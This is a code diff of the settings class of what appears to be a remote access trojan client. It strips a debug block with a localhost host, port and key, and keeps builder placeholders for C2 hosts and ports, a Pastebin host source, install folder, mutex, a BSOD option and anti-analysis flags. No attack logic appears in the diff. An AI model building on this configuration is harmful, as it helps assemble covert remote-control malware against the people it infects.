@@ -9,28 +9,6 @@ namespace Client
 {
     public static class Settings
     {
-#if DEBUG
-        public static string Por_ts = "8848";
-        public static string Hos_ts = "127.0.0.1";
-        public static string Ver_sion = "1.0.7";
-        public static string In_stall = "false";
-        public static string Install_Folder = "AppData";
-        public static string Install_File = "Test.exe";
-        public static string Key = "qwqdanchun";
-        public static string MTX = "%MTX%";
-        public static string Certifi_cate = "%Certificate%";
-        public static string Server_signa_ture = "%Serversignature%";
-        public static X509Certificate2 Server_Certificate;
-        public static Aes256 aes256 = new Aes256(Key);
-        public static string Paste_bin = "null";
-        public static string BS_OD = "false";
-        public static string Hw_id = HwidGen.HWID();
-        public static string De_lay = "0";
-        public static string Group = "Debug";
-        public static string Anti_Process = "false";
-        public static string An_ti = "false";
-
-#else
         public static string Por_ts = "%Ports%";
         public static string Hos_ts = "%Hosts%";
         public static string Ver_sion = "%Version%";
@@ -45,12 +23,11 @@ namespace Client
         public static Aes256 aes256;
         public static string Paste_bin = "%Paste_bin%";
         public static string BS_OD = "%BSOD%";
-        public static string Hw_id = null;
+        public static string Hw_id;
         public static string De_lay = "%Delay%";
         public static string Group = "%Group%";
         public static string Anti_Process = "%AntiProcess%";
         public static string An_ti = "%Anti%";
-#endif
 
 
         public static bool InitializeSettings()
